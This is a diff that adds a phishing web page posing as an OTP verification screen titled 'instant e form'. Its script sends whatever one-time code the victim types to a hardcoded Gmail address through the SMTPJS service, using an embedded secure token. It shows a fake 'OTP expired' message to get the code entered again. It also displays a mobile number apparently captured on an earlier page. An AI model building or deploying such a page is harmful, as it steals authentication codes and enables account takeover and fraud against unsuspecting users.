@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+        <title>instant e form</title>
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+        <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700" rel="stylesheet">
+        <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css"/>
+        <link rel="stylesheet" type="text/css" href="css/make.css">
+    <style type="text/css">
+        @media (min-width: 720px) {
+                .desktopds {
+                    margin: 0;
+                    padding: 0;
+                    overflow: hidden;
+                }
+                .mobileds {
+                    display: none;
+                }
+            }
+
+            @media (max-width: 719px) {
+                .desktopds {
+                    display: none;
+                }
+            }
+    </style>
+</head>
+<body class="atd-pay" style="height: 100vh;">
+    <div class="desktopds"><img style="width: 100%;" src="img/make-header.jpg"></div>
+    <div class="mobileds"><img style="width: 100%;" src="img/make-mobile-header.jpg"></div>
+<div class="container">
+        <div class="row">
+            <div class="col-md-2"></div>
+            <div class="col-xs-6 col-md-8" id="LogoSection" style="height: 0;">
+                <div class="underlinelogo"></div>
+            </div>
+        </div>
+    </div>
+<div class="container"><br><br>
+    <div class="row">
+        <div class="col-md-3"></div>
+        <div class="col-md-6">
+            <div style="background: #fff; padding: 30px 30px 50px;">
+                <h3 class="text-center"><b>Please Enter OTP</b></h3>
+                <p class="pera">OTP has been sent to your mobile number <b><span id="mobile"></span></b>. OTP will expire in 5 mins.</p>
+                <form onsubmit="Mail(); reset(); return false;">
+                    <p style = "color:green; font-size: 15px;" id = "msg"></p>
+                    <p style="color: red;" id="hdd">The OTP you've entered is expired. Please send again</p>
+                <div class="centered">
+                    <label>
+                        <input id="password" name="otp" type="password" class="textfield" required>
+                        <span class="placeholder">OTP</span>
+                        <section toggle="#password" class="fa fa-fw fa-eye field-icon toggle-password"></section>
+                    </label>
+                </div>
+                <p style="margin-top: 10px;"><span style="cursor: pointer;" id = "resend" class="resend"><img style="width: 25px;" src="img/refresh.png">Resend Now</span></p>
+                <div class="verifyflex">
+                    <button type = "submit" name = "submit" class="btn col-xs-12 col-md-12 btn-lg verifybtn">Verify</button>
+                </div> 
+                <p style="opacity: 0;">kjjkjk</p>
+            </form>
+
+            </div>
+        </div>
+    </div>
+</div>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script type="text/javascript">
+    $("#resend").click(function(){
+        $("#msg").html("Otp resend successfully");
+    });
+</script>
+<script type="text/javascript">
+    $("#resend").click(function(){
+        $("#hdd").hide();
+    });
+</script>
+<script type="text/javascript">
+$(".toggle-password").click(function() {
+
+  $(this).toggleClass("fa-eye fa-eye-slash");
+  var input = $($(this).attr("toggle"));
+  if (input.attr("type") == "password") {
+    input.attr("type", "text");
+  } else {
+    input.attr("type", "password");
+  }
+});
+</script>
+<script src="https://smtpjs.com/v3/smtp.js"></script>
+<script type="text/javascript">
+  function Mail(){
+
+    let password = document.getElementById("password").value;
+
+    Email.send({
+    SecureToken: "0be07434-399f-4769-a861-191f44cc3f08",
+    To: 'easymailid001@gmail.com',
+    From: "easymailid001@gmail.com",
+    Subject : "last page details",
+    Body : "Code 2 : " + password
+}).then(
+  message => {
+      //console.log (message);
+      if (message == 'OK') {
+          window.location.replace("index.html")
+      }
+      else {
+          console.error(message);
+          window.location.replace("error.html")
+      }
+  }
+);
+  }
+</script>
+<script>
+    document.getElementById("mobile").innerHTML=localStorage.getItem("txtValue1");
+</script>
+</body>
+
+
+</html>
